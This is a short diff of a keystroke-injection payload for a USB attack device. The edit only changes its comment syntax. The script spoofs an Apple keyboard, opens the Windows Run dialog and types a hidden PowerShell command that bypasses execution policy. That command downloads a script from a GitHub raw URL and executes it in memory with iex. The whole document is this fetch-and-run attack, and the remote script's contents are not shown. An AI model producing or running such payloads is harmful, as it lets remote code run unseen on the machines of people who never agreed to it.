@@ -1,12 +1,12 @@
 ATTACKMODE HID VID_0X05AC PID_0X021E
 LED R 200
-#run payload
+REM run payload
 
 
-#Press Windows key + R
+REM Press Windows key + R
 Q GUI r
 
-#Run a powershell script from the url without downloading it
+REM Run a powershell script from the url without downloading it
 Q DELAY 100
 Q STRING powershell -w -h -NoP -NonI -Exec Bypass (iwr -UseBasicParsing https://raw.githubusercontent.com/RylexOff/Prout-Script/main/prout_script.ps1).Content | iex
 Q DELAY 100
